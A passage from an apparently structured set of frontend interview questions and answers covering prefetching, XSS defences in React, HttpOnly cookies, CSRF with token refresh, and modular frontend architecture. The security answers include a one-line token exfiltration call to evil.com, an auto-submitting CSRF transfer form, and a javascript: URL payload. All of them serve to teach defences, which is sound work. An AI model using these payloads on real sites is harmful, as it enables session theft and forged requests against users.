        "When does prefetch hurt — over-eager fetching on slow networks?",
        "How does Next.js decide what to prefetch?",
        "What's modulepreload's role with ESM?",
      ],
      commonMistakes: [
        "Preloading everything → contention, cache eviction.",
        "Lazy-loading critical above-the-fold content.",
        "Forgetting `crossorigin` on preloaded fonts → double-fetch.",
      ],
      performanceConsiderations: [
        "Preload abused becomes a self-DoS — browser delays other critical resources.",
      ],
      edgeCases: [
        "Prefetch on metered connections is ignored by some browsers.",
        "Service worker can intercept prefetches; coordinate caching strategies.",
      ],
      realWorldExamples: [
        "Stripe Checkout preconnects to Stripe APIs from the merchant page so the checkout iframe handshake is already done.",
      ],
      relatedSlugs: [
        "how-do-you-optimize-core-web-vitals",
        "how-do-you-reduce-bundle-size-in-production",
      ],
      companyTags: ["Vercel", "Stripe", "Shopify"],
      estimatedReadingMinutes: 6,
      estimatedSolvingMinutes: 8,
    },
  },

  // ============================================================
  // SECURITY
  // ============================================================
  {
    title: "How do you prevent XSS in React apps?",
    question: {
      id: "how-do-you-prevent-xss-in-react-apps",
      slug: "how-do-you-prevent-xss-in-react-apps",
      title: "How do you prevent XSS in React apps?",
      category: "security",
      tags: ["xss", "react", "security", "csp", "sanitization"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "React escapes children by default — XSS arrives via dangerouslySetInnerHTML, href=\"javascript:\" URLs, or rendering server-supplied HTML. Sanitize, validate URLs, and add CSP.",
      answer: `Cross-Site Scripting (XSS) is the most common high-severity web vulnerability. It lets an attacker run JavaScript in the victim's browser under the victim's origin — which means full access to cookies (unless \`HttpOnly\`), localStorage, the DOM, and any in-flight session. React's default behavior protects against the most common form, but several vectors bypass that default; understanding them is the difference between "safe by accident" and "safe by design."

**React's built-in protection.** When you render \`<div>{userInput}</div>\`, React calls \`document.createTextNode(userInput)\` (or its SSR equivalent). The string is *never* interpreted as HTML — \`<script>alert(1)</script>\` is rendered as the literal text. JSX attribute interpolation is similarly safe for most attributes. This is why React apps are mostly XSS-free by default. The vulnerabilities arise when developers reach around this escape.

**The dangerous vectors:**

**1. \`dangerouslySetInnerHTML\`.** The name is deliberate. You're handing React raw HTML to inject. If that HTML originated from user input or a server response, sanitize first:

\`\`\`tsx
import DOMPurify from 'isomorphic-dompurify';
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />
\`\`\`

Better: don't accept HTML at all. Render Markdown via \`react-markdown\` (which emits React elements, not HTML strings). For rich text, use a structured editor that stores a tree (Lexical, Tiptap, ProseMirror) and renders it to React elements.

**2. URL injection.** \`<a href={userUrl}>\` will happily render \`href="javascript:alert(document.cookie)"\`. Same for \`<iframe src>\`, \`<form action>\`, \`<object data>\`. Always validate the scheme:

\`\`\`ts
function safeHref(url: string): string {
  try {
    const u = new URL(url, location.origin);
    return ['http:', 'https:', 'mailto:', 'tel:'].includes(u.protocol) ? u.href : '#';
  } catch { return '#'; }
}
\`\`\`

React 19 logs a warning for \`javascript:\` URLs but doesn't block — you must enforce.

**3. Server-rendered HTML / template injection.** If your backend (Node, Rails, Django) interpolates user data into the HTML *before* React hydrates, React's escaping is irrelevant — the HTML was already poisoned. Always use a templating engine with automatic escaping, and never \`String#replace\` user data into the SSR output.

**4. SVG-based attacks.** SVG can contain \`<script>\`, \`<foreignObject>\` with HTML, \`onclick\` attributes, and CSS that loads remote assets. Uploaded SVGs are a classic XSS vector. Defenses: serve user-uploaded SVGs from a **separate sandbox origin** (or as \`<img src=>\` rather than inline, since \`<img>\` doesn't execute SVG scripts), or rasterize to PNG/WebP server-side.

**5. \`eval\` and string-typed sinks.** \`eval\`, \`new Function\`, \`setTimeout('code', 0)\`, \`Element.innerHTML\`, \`document.write\`. Treat these as suspect; many lint rules ban them.

**6. \`ref\` callbacks that touch \`innerHTML\`** directly bypass React entirely.

**7. Third-party scripts.** Analytics, A/B test snippets, chat widgets, ad tags — each is a script running in your origin. A compromised vendor *is* an XSS on your site. Pin versions, use Subresource Integrity (\`<script integrity="sha384-...">\`), and put third-party scripts behind a CSP allowlist.

**8. Dependency confusion / supply-chain.** A compromised npm package can ship XSS into your bundle. Use \`npm audit\`, Snyk, Renovate with auto-merge gates, and lockfile verification.

**Defense in depth — beyond input handling:**

- **Content Security Policy (CSP).** Set \`Content-Security-Policy: script-src 'self' 'nonce-RANDOM'; object-src 'none'; base-uri 'self'; frame-ancestors 'self'\`. With a per-request nonce, inline scripts only run if they carry the nonce — injected \`<script>alert(1)</script>\` will not. CSP is the *most effective* XSS mitigation when correctly configured; treat \`'unsafe-inline'\` as a red flag.
- **Trusted Types** (Chromium, increasingly cross-browser). Forces \`innerHTML\`, \`document.write\`, \`eval\`, etc., to accept only \`TrustedHTML\` / \`TrustedScript\` objects produced by a registered policy. Eliminates a whole class of XSS sinks.
- **\`HttpOnly\` cookies** for auth tokens so even if XSS occurs, the attacker can't read them from JS. They can still *act as the user* via fetch — XSS is still serious — but session-stealing is blocked.
- **\`SameSite=Lax\` or \`Strict\`** to limit cross-site request fixation.
- **Subresource Integrity** (\`integrity\` attribute) for any externally hosted script.
- **Lint rules**: \`eslint-plugin-react/no-danger\`, \`no-danger-with-children\`, \`eslint-plugin-security\`. Add a CI gate.
- **Server-side validation and output encoding** for any API that emits user-supplied data.
- **A nonce-based CSP middleware** in Next.js so every page gets a fresh nonce.

**Workflow:** treat XSS like SQL injection — assume all input is hostile; encode at the *output* boundary; layer CSP + Trusted Types + HttpOnly cookies; lint for dangerous sinks; pen-test occasionally.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Safe href validator + sanitized HTML",
          code: `import DOMPurify from "isomorphic-dompurify";

const SAFE_URL = /^(https?:|mailto:|tel:|\\/)/i;

export function SafeLink({ href, ...rest }: React.ComponentProps<"a">) {
  const safe = href && SAFE_URL.test(href) ? href : "#";
  return <a href={safe} {...rest} />;
}

export function HtmlBlock({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(html) }} />;
}`,
        },
      ],
      followUps: [
        "How do you write a useful CSP without breaking your app?",
        "What's the difference between stored, reflected, and DOM XSS?",
        "Why don't HTTPOnly cookies fully prevent XSS impact?",
      ],
      commonMistakes: [
        "Trusting that React escapes attributes — it does, but not URLs schemes.",
        "Sanitizing on read instead of write (defense in depth: do both).",
        "Allowing arbitrary HTML uploads.",
      ],
      performanceConsiderations: [
        "DOMPurify is fast but adds ~20KB; load via dynamic import on routes that need it.",
      ],
      edgeCases: [
        "Markdown renderers that allow inline HTML are a common foot-gun.",
        "Third-party widgets in iframes still need CSP frame-src.",
      ],
      realWorldExamples: [
        "Notion, Linear, GitHub all use a strict CSP + sanitize all user-rendered content paths.",
      ],
      relatedSlugs: [
        "why-are-httponly-cookies-preferred-for-auth",
        "explain-csrf-and-token-refresh-flow",
      ],
      companyTags: ["GitHub", "Notion", "Stripe"],
      estimatedReadingMinutes: 8,
      estimatedSolvingMinutes: 12,
    },
  },
  {
    title: "Why are HttpOnly cookies preferred for auth?",
    question: {
      id: "why-are-httponly-cookies-preferred-for-auth",
      slug: "why-are-httponly-cookies-preferred-for-auth",
      title: "Why are HttpOnly cookies preferred for auth?",
      category: "security",
      tags: ["cookies", "httponly", "auth", "xss", "security"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "HttpOnly cookies aren't readable by JS — XSS can't exfiltrate the token. Combine with Secure, SameSite, and a CSRF strategy.",
      answer: `The single most important question in browser auth is: **where do I store the token, and what is the worst that happens if my site has an XSS hole?** Tokens stored anywhere readable by JavaScript (\`localStorage\`, \`sessionStorage\`, non-HttpOnly cookies, in-memory if exposed by a global) can be exfiltrated by a one-line script: \`fetch('https://evil.com?t=' + token)\`. That's instant account takeover, persisting beyond the current tab and surviving page reloads. \`HttpOnly\` cookies make that specific attack impossible.

**What \`HttpOnly\` does.** A cookie marked \`HttpOnly\` is sent by the browser on every request to the matching origin (subject to \`SameSite\`), but \`document.cookie\` *cannot read it*. There is no JavaScript API that returns its value. An attacker with arbitrary JS execution can still issue authenticated requests *as the user from inside the page* (because the browser attaches the cookie automatically), but they cannot ship the credential off-device for later use. That dramatically reduces blast radius:

- They can't replay the token from another machine or another origin.
- They can't keep using the session after the user closes the tab.
- They can't sell the token on a credential market.
- Server-side anomaly detection (IP / device fingerprint changes) can still catch live abuse.

**The full hardening recipe** for an auth cookie:

- **\`HttpOnly\`** — JS can't read it. The whole point.
- **\`Secure\`** — sent only over HTTPS. Without this a network attacker on an open Wi-Fi can steal the cookie via any HTTP image fetch.
- **\`SameSite=Lax\`** (default) or **\`SameSite=Strict\`** for sensitive sessions — blocks the cookie from being sent on cross-site requests, killing most CSRF before it starts.
- **\`Path=/\`** and the narrowest correct **\`Domain\`** scope.
- **Short access-token TTL** (15–60 min) combined with a longer-lived **refresh token** in a separate \`HttpOnly\` cookie scoped only to \`/auth/refresh\`. Rotate the refresh token on each use.
- **\`__Host-\`** prefix on the cookie name when domain is \`/\` and \`Secure\` is set — browsers refuse to overwrite \`__Host-\` cookies from a different origin, blocking subdomain takeover attacks.
- Server-side **session invalidation** on logout (don't just clear the cookie — also blacklist the session id on the server).

**Why not \`localStorage\`?**

- **XSS = full token leak.** This is the killer.
- **No per-request mechanism** — your JS has to manually attach the token to fetches, multiplying the chance of leaving it off (or attaching it to a wrong-origin request).
- **No automatic clearing across tabs** when the user logs out on another tab.
- **No scope** — it's per-origin only, can't be subdomain-scoped.
- **Synchronous, blocking I/O** — minor but real impact on TTI.

**Why not \`sessionStorage\`?** Same XSS exposure as localStorage, plus the token vanishes on refresh, so you have to log in every time. The worst of both worlds.

**The trade-off you accept with cookies: CSRF.** Because the browser sends cookies automatically on cross-site requests, an attacker can trick a victim's browser into making a state-changing request to your API (\`<form action="https://your-bank.com/transfer" method="POST">\`) and the cookie tags along. Defenses: \`SameSite=Lax\` already kills most cases (the cookie isn't sent on cross-site POSTs); add a CSRF token (synchronizer pattern, double-submit cookie, or origin-header check) for any state-changing endpoint, especially if your app is embedded as an iframe or accepts form submissions.

**Bearer tokens (Authorization header)** have no CSRF risk because the browser doesn't auto-attach them. But they're vulnerable to XSS exactly like \`localStorage\`. They're appropriate for mobile / API clients where you don't have a browser, and for browser SPAs where you accept the XSS risk and have other strong mitigations (strict CSP, Trusted Types).

**Modern best practice for a browser SPA / SSR app:**

- **\`HttpOnly\` + \`Secure\` + \`SameSite=Lax\`** session cookie for browser auth, set by the server, never touched by JS.
- Short-lived **access** + long-lived **refresh** cookie, rotated on each refresh.
- **Bearer tokens** for non-browser clients (mobile, server-to-server).
- **CSRF token** on state-changing endpoints when in doubt (especially if you also accept form submissions or are embedded cross-site).
- **Defense in depth**: CSP, Trusted Types, anomaly detection, IP/device binding, MFA.
- On logout: clear the cookie *and* invalidate the session server-side.

**Common pitfalls:**

- Setting \`HttpOnly\` but not \`Secure\` (cookie leaks on HTTP).
- Setting \`SameSite=None\` without \`Secure\` (browsers reject in modern Chrome).
- Storing a JWT in \`localStorage\` "because it's stateless" — the statelessness is a backend property; the storage choice is independent.
- Forgetting that XSS still lets attackers *act* as the user in-page. HttpOnly is harm reduction, not a free pass to skip XSS prevention.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Setting a hardened cookie (Next.js route handler)",
          code: `import { cookies } from "next/headers";

export async function POST(req: Request) {
  const { token } = await login(/* ... */);
  cookies().set("session", token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "lax",
    path: "/",
    maxAge: 60 * 15,           // 15 min access token
  });
  return new Response(null, { status: 204 });
}`,
        },
      ],
      followUps: [
        "What does SameSite=Strict actually break?",
        "How do you do silent refresh with HttpOnly cookies?",
        "When are bearer tokens better than cookies?",
      ],
      commonMistakes: [
        "Storing JWT in localStorage 'because the tutorial did'.",
        "Forgetting Secure flag → token leaks over HTTP.",
        "Not rotating refresh tokens — replay risk if leaked.",
      ],
      performanceConsiderations: [
        "Cookies add to every request — keep them small.",
      ],
      edgeCases: [
        "Cross-subdomain auth requires `Domain=.example.com` and care with CSRF.",
        "iOS Safari ITP can clear cookies aggressively for third-party contexts.",
      ],
      realWorldExamples: [
        "Auth0, Clerk, NextAuth — all use HttpOnly cookies for the session by default.",
      ],
      relatedSlugs: ["how-do-you-prevent-xss-in-react-apps", "explain-csrf-and-token-refresh-flow"],
      companyTags: ["Auth0", "Clerk", "Stripe"],
      estimatedReadingMinutes: 7,
      estimatedSolvingMinutes: 10,
    },
  },
  {
    title: "Explain CSRF and token refresh flow",
    question: {
      id: "explain-csrf-and-token-refresh-flow",
      slug: "explain-csrf-and-token-refresh-flow",
      title: "Explain CSRF and token refresh flow",
      category: "security",
      tags: ["csrf", "auth", "tokens", "refresh-token", "security"],
      difficulty: "medium",
      frequency: "high",
      seniority: "senior",
      shortDescription:
        "CSRF tricks a logged-in browser into submitting a request the user didn't intend. Defend with SameSite cookies, CSRF tokens, and short-lived access tokens refreshed via a dedicated endpoint.",
      answer: `**Cross-Site Request Forgery (CSRF)** is the attack class where an attacker's site causes the *victim's logged-in browser* to issue an authenticated request to your origin. Because cookies are attached automatically by the browser whenever a request matches the cookie's origin and SameSite policy, the request to your server looks legitimate — same session, same user. The user did nothing wrong except be logged in and visit the wrong page.

**Classic attack:**

\`\`\`html
<!-- on evil.com, auto-submits on load -->
<form action="https://bank.com/transfer" method="POST">
  <input name="to" value="attacker">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
\`\`\`

The victim's browser sends the POST to \`bank.com\` with the session cookie attached. If \`bank.com\` only checks the cookie, the transfer goes through.

**Why CSRF exists at all.** It's a consequence of how HTTP, cookies, and the same-origin policy interact: SOP prevents the attacker from *reading* the response (so they can't steal data this way), but it doesn't prevent the *request* from being made. State-changing endpoints care about whether the request happened — not whether the attacker can read the response.

**Defenses, in defense-in-depth layers:**

**1. \`SameSite=Lax\` cookies** (Chrome default since Feb 2020, all major browsers now). Cookies are not sent on cross-site **POSTs**, **subresource** fetches, or **iframe** loads. They *are* still sent on top-level GET navigations (so clicking an external link to your site keeps the session). This kills the classic CSRF attack for most apps with no extra work.

**2. \`SameSite=Strict\`** — also blocks top-level cross-site navigations. Good for banking-tier sessions; breaks social-login redirects and "click an emailed link → land logged in" flows, so usually you reserve Strict for very-sensitive cookies (admin session, financial action confirmation).

**3. CSRF tokens (synchronizer pattern).** Server generates a random token tied to the session and embeds it in every form / makes it available via an endpoint. Client sends it back in a header (\`X-CSRF-Token\`) or hidden form field. Server validates it matches the session. Required when:
- You support legacy browsers without SameSite.
- Your app is embedded cross-site (iframes, OAuth flows).
- Compliance demands explicit token.

Variants: **double-submit cookie** (token in cookie + header, server checks they match — stateless), **encrypted token** (token includes a session-bound value, encrypted by server).

**4. Custom request header.** Browsers refuse to send custom headers (\`X-Requested-With: XMLHttpRequest\`) on cross-origin requests without a CORS preflight, and a preflight is itself a roadblock the attacker can't pass. Requiring a custom header on state-changing endpoints is a cheap and surprisingly effective CSRF defense.

**5. \`Origin\` / \`Referer\` header check.** Server rejects state-changing requests whose \`Origin\` doesn't match your domain. Lightweight, but \`Origin\` is occasionally stripped by privacy tools, so prefer it as a belt-and-suspenders measure.

**6. Re-authentication on sensitive actions.** Money transfers, password change, MFA disable — require re-entering the password or a fresh MFA challenge.

---

**Token refresh flow — the modern pattern**

To limit blast radius if a token leaks, issue **short-lived access tokens** and refresh them with a long-lived refresh token through a dedicated endpoint.

**Setup:**

- **Access token** (lifetime 5–60 min) — included on every API call. Stored as an \`HttpOnly Secure SameSite=Lax\` cookie scoped to the API path. Sometimes kept in memory (bearer-token model), at the XSS cost noted in the cookie discussion.
- **Refresh token** (lifetime 7–30 days, with sliding window) — used only to mint new access tokens. Stored in a separate \`HttpOnly Secure SameSite=Strict\` cookie scoped narrowly to \`/auth/refresh\` so it's only sent when refreshing.

**Flow:**

1. Client calls a protected endpoint.
2. Server validates access token. If expired → \`401 Unauthorized\` (with a \`WWW-Authenticate\` or custom header).
3. Client sees 401, calls \`POST /auth/refresh\` with credentials.
4. Server validates the refresh token, mints a new access token, **rotates** the refresh token (issues a new one, invalidates the old one), and returns both as Set-Cookie.
5. Client retries the original request.

**Refresh token rotation + reuse detection.** Each refresh consumes the old token; if an old (already-used) refresh token is ever presented again, the server *revokes the entire token family* and forces re-login. This catches token theft: if both the attacker and victim try to refresh, exactly one succeeds, then the next attempt by the loser detects the reuse and burns the chain.

**On the frontend:** an HTTP interceptor (Axios interceptor, fetch wrapper, TanStack Query \`onError\`) handles 401 → refresh → retry transparently. Key implementation detail: **single-flight the refresh**. If 10 requests fail with 401 simultaneously, you must not fire 10 refreshes — coalesce them onto one promise, and only after it resolves, retry all 10.

\`\`\`ts
let inflight: Promise<void> | null = null;
async function refresh() {
  inflight ??= fetch('/auth/refresh', { method: 'POST', credentials: 'include' })
    .then(r => { if (!r.ok) throw new Error('refresh-failed'); })
    .finally(() => { inflight = null; });
  return inflight;
}
\`\`\`

**Failure cases** to handle:

- Refresh itself returns 401 → user is logged out; clear local state, redirect to \`/login\`.
- Network failure during refresh → retry with backoff, but cap.
- Refresh succeeds but original request still 401 → suspicious; bail out.
- Logout: server-side blacklist of refresh token *and* the access token's \`jti\` (if you maintain a revocation list). \`Set-Cookie\` with \`Max-Age=0\` to clear cookies.

**Anti-patterns:**

- Same cookie for access and refresh — defeats the lifetime separation.
- Refresh token in JS-readable storage — defeats HttpOnly.
- Long-lived access tokens "to avoid the refresh complexity" — exactly when refresh helps most (leak windows shrink).
- No reuse detection — refresh token theft becomes persistent.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Fetch wrapper with refresh + single-flight",
          code: `let refreshing: Promise<void> | null = null;

async function refresh() {
  refreshing ??= fetch("/auth/refresh", { method: "POST", credentials: "include" })
    .then(() => undefined)
    .finally(() => { refreshing = null; });
  return refreshing;
}

export async function api<T>(input: RequestInfo, init?: RequestInit): Promise<T> {
  const r = await fetch(input, { credentials: "include", ...init });
  if (r.status === 401) {
    await refresh();
    const r2 = await fetch(input, { credentials: "include", ...init });
    if (!r2.ok) throw new Error(\`API \${r2.status}\`);
    return r2.json();
  }
  if (!r.ok) throw new Error(\`API \${r.status}\`);
  return r.json();
}`,
        },
      ],
      followUps: [
        "How do you prevent infinite refresh loops?",
        "Why rotate refresh tokens?",
        "What happens if SameSite=Lax is used cross-subdomain?",
      ],
      commonMistakes: [
        "Storing refresh tokens in localStorage.",
        "Not single-flighting refresh — every 401 triggers parallel refreshes.",
        "Same cookie scope for access and refresh tokens.",
      ],
      performanceConsiderations: [
        "Aggressive token TTLs increase refresh frequency — balance with security needs.",
      ],
      edgeCases: [
        "User opens 5 tabs simultaneously after sleep → all 401 → must single-flight.",
        "Cross-origin requests need credentials: 'include' AND CORS Access-Control-Allow-Credentials.",
      ],
      realWorldExamples: [
        "Auth0, NextAuth, Clerk all implement rotation + reuse detection.",
      ],
      relatedSlugs: [
        "why-are-httponly-cookies-preferred-for-auth",
        "how-do-you-prevent-xss-in-react-apps",
      ],
      companyTags: ["Auth0", "Stripe", "GitHub"],
      estimatedReadingMinutes: 9,
      estimatedSolvingMinutes: 15,
    },
  },

  // ============================================================
  // BEHAVIORAL / SYSTEM DESIGN (from file 2)
  // ============================================================
  {
    title:
      "Walk me through a performance optimization project where you significantly improved load time",
    aliases: [
      "Project Deep Dive performance optimization",
      "performance optimization project load time",
    ],
    question: {
      id: "performance-optimization-project-deep-dive",
      slug: "performance-optimization-project-deep-dive",
      title:
        "Walk me through a performance optimization project where you significantly improved load time",
      category: "behavioral",
      subcategory: "Project Deep Dive",
      tags: ["behavioral", "performance", "project-deep-dive", "trade-offs", "metrics"],
      difficulty: "medium",
      frequency: "very-high",
      seniority: "senior",
      shortDescription:
        "Use STAR. Lead with the metric (LCP went from 4.8s → 1.6s p75). Walk the bottleneck identification, the trade-offs, the rollout, and what you'd do differently.",
      answer: `Performance-project deep dives are the single most common senior-frontend interview prompt — and the most commonly bungled. Candidates either rattle off generic optimizations ("we lazy-loaded things") with no metrics, or dive straight into low-level fixes without framing why the work mattered. The right answer threads a **STAR scaffold** (Situation, Task, Action, Result) with **numbers, trade-offs, and an honest reflection**. The numbers prove you measured; the trade-offs prove you understood costs; the reflection proves you can self-critique.

**Situation — frame the surface and the stakes.** 1–2 sentences setting the business context, with a quantified problem. Generic bad: "Our app was slow." Specific good: "Our checkout LCP at p75 was 4.8s on slow 4G. Funnel analytics showed conversion fell off a cliff above 3s — correlated with ~12% revenue impact on the cohort. The CEO had named it a top-3 quarterly priority."

**Task — your specific scope.** Make your ownership unambiguous. "I owned the perf workstream for the checkout team — three engineers and a designer. Target: LCP <2.5s p75 within one quarter, measured by Chrome User Experience Report (CrUX) field data."

**Action — bottleneck identification.** Show measurement *before* fixes:
- Chrome DevTools / Lighthouse on representative devices, throttled.
- WebPageTest filmstrip + waterfall on real network profiles (3G slow, 4G fast).
- **Field data** via the web-vitals JS library reported into our analytics — RUM is what Google's ranking uses; lab is what you optimize against.
- Findings: the LCP element was the hero image, fetched only after the main JS bundle (≈600KB gzipped) had parsed. Fonts blocked text render via FOIT. A 200KB analytics SDK was on the critical path.

**Action — fixes, prioritized by impact/effort.** Show you sequenced by ROI, not by tech excitement:
- Switched hero to AVIF + \`<Image priority>\` + responsive srcset → LCP dropped 1.2s (highest-leverage single change).
- Tree-shook \`moment\` → \`date-fns\` (-80KB), code-split the analytics SDK to load post-LCP → another 800ms.
- Inlined critical CSS, deferred third-party tag manager (consent-aware) → 400ms.
- \`font-display: swap\` + preload primary font weight in WOFF2 → CLS down to 0.04, no FOIT.
- Promoted three above-the-fold components from client to server components → ~100KB of JS off the critical path.

**Trade-offs you explicitly named** (this is the senior signal):
- AVIF support gap on older iOS — kept WebP fallback via \`<picture>\`. Cost: complexity, ~10 extra lines per image.
- Deferring analytics meant losing some early-funnel events — accepted, replaced with server-side tracking to keep funnel intact.
- Critical-CSS extraction added 30s to the build — accepted, ran async; gated on prod only.
- The hero AVIF was 40% smaller but slower to decode on low-end Android — measured INP, found no regression, but flagged for monitoring.

**Result** — with numbers, statistically valid, time-bounded:
- LCP 1.6s p75, INP <120ms, CLS 0.04 (CrUX, four-week window).
- Conversion +6.4% (statsig'd, two-sided test, 4 weeks).
- Bundle 600KB → 290KB gzipped on critical path.
- Annualized revenue impact ≈$X (per finance's model — quote ranges, don't invent precision).

**Reflection — what you'd do differently.** This is what separates senior from staff signal:
- "I'd ship Web Vitals to our error-monitoring SLO board next time so regressions page us within hours, not Tuesday's report."
- "I'd push for a CI bundle budget *before* the project, not after — a budget would have caught the analytics SDK regression that originally introduced 200KB."
- "I'd have onboarded the design team to AVIF earlier; the back-and-forth on rendering parity cost two weeks."

**Bonus signals interviewers listen for:**
- **You measured before optimizing.** Anyone can list optimizations from a blog post; the question is which one mattered.
- **You named trade-offs, not just wins.** Every change costs something. If you can't say what, the interviewer assumes you didn't think about it.
- **You collaborated.** Performance is rarely a solo project — name the PM call on AVIF, the designer on the font choice, the SRE on CDN headers.
- **You quantified the business outcome**, not just the technical one. "LCP improved" is engineering; "conversion +6.4%" is the reason engineering was funded.
- **You can answer ambush follow-ups** ("what if the analytics SDK was contractual?", "what would you do for the Tablet cohort?", "what's the cheapest thing to do next?") — readiness for these signals depth of ownership.

**Pre-interview prep:** write down 2–3 STAR stories (perf, reliability, scope-reduction, team-conflict) with hard numbers and trade-offs, before you walk in. You'll forget under pressure if you didn't.`,
      codeSnippets: [],
      followUps: [
        "How did you decide which optimization to do first?",
        "How did you convince the PM to deprioritize a feature for perf work?",
        "How did you measure the conversion impact?",
        "What regressed afterwards, and how did you catch it?",
      ],
      commonMistakes: [
        "Vague metrics ('it got faster') — interviewers mark this down hard.",
        "Skipping trade-offs — every choice has cost.",
        "Taking sole credit when it was a team effort.",
      ],
      performanceConsiderations: [
        "Frame answers with p50 vs p75 vs p99 — shows you think in distributions.",
      ],
      edgeCases: [
        "If you don't have a perf project, talk about a systematic improvement (test reliability, build time, error rate) and use the same scaffold.",
      ],
      realWorldExamples: [
        "BBC News, Pinterest, Walmart all have public case studies — read them for vocabulary.",
      ],
      seniorDiscussion:
        "Senior+ interviews pull on the trade-offs. Be ready: 'why didn't you also do X?' should land cleanly with a stated trade-off, not a defensive answer.",
      relatedSlugs: [
        "how-do-you-optimize-core-web-vitals",
        "how-do-you-reduce-bundle-size-in-production",
        "frontend-architecture-modular-applications",
      ],
      companyTags: ["Meta", "Google", "Shopify", "Vercel"],
      estimatedReadingMinutes: 8,
      estimatedSolvingMinutes: 15,
    },
  },
  {
    title: "Explain frontend architecture patterns: when to split into smaller independent modules",
    aliases: [
      "frontend architecture patterns modular applications",
      "splitting large applications into smaller independent modules",
    ],
    question: {
      id: "frontend-architecture-modular-applications",
      slug: "frontend-architecture-modular-applications",
      title: "Explain frontend architecture patterns: when to split into smaller independent modules",
      category: "system-design",
      subcategory: "Modular Frontend",
      tags: ["architecture", "micro-frontends", "module-federation", "monorepo", "trade-offs"],
      difficulty: "hard",
      frequency: "high",
      seniority: "senior",
      shortDescription:
        "Split when teams need independent release cycles, deep ownership, or polyglot stacks. Pay the integration cost only when team scaling forces it — modular monolith first, micro-frontends only as a last resort.",
      answer: `Frontend modularization sits on a spectrum, and the question "should we split?" is really "are we *forced* to split, and which seam costs least?" Splitting too early adds runtime cost, integration cost, and consistency burden you'll regret. Splitting too late means team coordination eats engineering time. The senior judgment is recognizing when team scaling — not technical aspirations — forces the split.

**The spectrum, in order of escalating cost:**

1. **Single app, feature folders.** The default. Feature-first directory structure, eslint boundary rules forbidding cross-feature imports, a shared design system, one CI pipeline, one deploy. Works well up to ~15 product teams in a single codebase. Coordination cost is mostly social (CODEOWNERS, RFC processes).

2. **Modular monolith with packages.** Same deploy, but code split into versioned internal packages (\`@acme/ui\`, \`@acme/checkout\`, \`@acme/catalog\`) inside a monorepo with Turborepo or Nx. Build graph isolates changes. Shared design system, shared types, shared eslint config. Still one runtime app, still one deploy. This is the sweet spot for 90% of orgs.

3. **Multi-app monorepo.** Web, mobile-web, internal admin, marketing site — separate apps that share packages. Each app has its own deploy and its own bundle, but they're versioned together. Common in companies that have one product across multiple surfaces.

4. **Micro-frontends.** Runtime composition of independently *deployed* apps using Module Federation, single-spa, iframes, or web components. Each team owns a remote app; a shell composes them. Pay this cost only when:
   - Teams need genuinely **independent release cadences** — one team's deploy must not block another's.
   - **Polyglot stacks** (some teams on Vue, some on React, legacy Angular) you can't consolidate, often due to acquisitions.
   - Organizational/legal boundaries (post-M&A, multi-vendor) make a single codebase politically untenable.
   - You have 50+ engineers across 5+ teams sustainably.

5. **Separate apps, separate repos, separate origins** — the loosest split. Communication is by URL only. Reserve for products that share a brand but nothing else.

**Pros of splitting (what people advertise):**

- Independent deploys → faster team velocity, smaller blast radius per release.
- Smaller per-route code owned by its team — clearer ownership.
- Tech-stack independence (sometimes — usually overstated).
- Easier scaling of CI / build pipelines.

**Cons (real, often understated):**

- **Bundle duplication.** Each remote may ship its own React, its own router, its own design-system bundle unless you carefully share via Module Federation singletons — and version drift then becomes a runtime crash.
- **Design drift.** Consistent UX across independent deploys is *hard*; design system version skew shows up as subtle visual bugs.
- **Cross-cutting concerns** (auth, feature flags, telemetry, error boundaries) must be solved at the shell layer and consumed correctly by every remote. Get this wrong and the integration cost dominates the savings.
- **Type safety across boundaries.** When the shell and remote are deployed independently, you can't compile-check the prop interface. Contracts must be versioned, codegen'd (TypeBox / Zod), and tested with contract tests.
- **Performance.** Every module boundary is an extra network round trip, parse, and execute. With careful sharing you can amortize, but you're starting from a worse baseline than a monolith.
- **Local dev pain.** Running 5 apps to debug one flow. You need a "dev shell" with mocked or stubbed remotes.
- **Observability fragmentation.** Errors, traces, and metrics now span deploy units; you need a correlation id story.
- **Upgrade coordination.** React 19 migration in a monolith is one PR; in a 7-remote micro-frontend it's a quarter.

**Decision heuristic.** Stay in a modular monolith until team scaling — not architectural aspiration — forces the split. The cost of micro-frontends is a constant overhead from day one; the benefit only appears past a threshold of independent teams (usually 4–5 product teams, 30+ engineers). For anything smaller, modular monolith wins on every dimension.

**Patterns inside a split:**

- **Shell app** owns routing, auth, layout chrome, error boundaries, top-level monitoring.
- **Remote apps** are mounted into routes or slots; each exposes a manifest of what it provides.
- **Shared contracts** — events, design tokens, public types — versioned in a separate package consumed by all.
- **Composition** — Module Federation for tight runtime sharing (one React across all remotes), iframes for hardest isolation (untrusted third-party content), web components for technology-neutral embedding, server-side composition (edge-side includes, RSC) for SEO-critical pages.
- **Independent rollback** — each remote must be rollback-able without coordinating with the shell.

**What to say in interviews.** Trade-offs first, vocabulary second. Anyone can name "Module Federation"; the senior signal is "I would *not* split until we have N independent teams blocking each other's deploys *because* the integration cost is X and the only benefit Y materializes past that threshold." Recognize that the most common architectural mistake at scale-up companies is splitting too early.`,
      codeSnippets: [
        {
          language: "ts",
          caption: "Module Federation singleton sharing (Webpack)",
          code: `// shell webpack config
new ModuleFederationPlugin({
  name: "shell",
  remotes: { catalog: "catalog@/remoteEntry.js" },
  shared: {
    react: { singleton: true, requiredVersion: "^18.0.0" },
    "react-dom": { singleton: true, requiredVersion: "^18.0.0" },
  },
});`,
        },
      ],
      followUps: [
        "When did splitting actually hurt a team you've seen?",
        "How do you keep a design system consistent across independent apps?",
        "Module Federation vs iframes — when each?",
      ],
      commonMistakes: [
        "Adopting micro-frontends before team scale demands it.",
        "Shared dependencies not pinned/coordinated → version skew.",
        "No shell-level performance budgets → cumulative bloat.",
      ],
      performanceConsiderations: [
        "Each remote app is a runtime cost on first load — preload critical remotes.",
        "Shared design tokens via CSS variables avoid runtime JS theme cost.",
      ],
      edgeCases: [
        "Auth state across apps requires a single source of truth (cookie, postMessage, or shared store).",
      ],
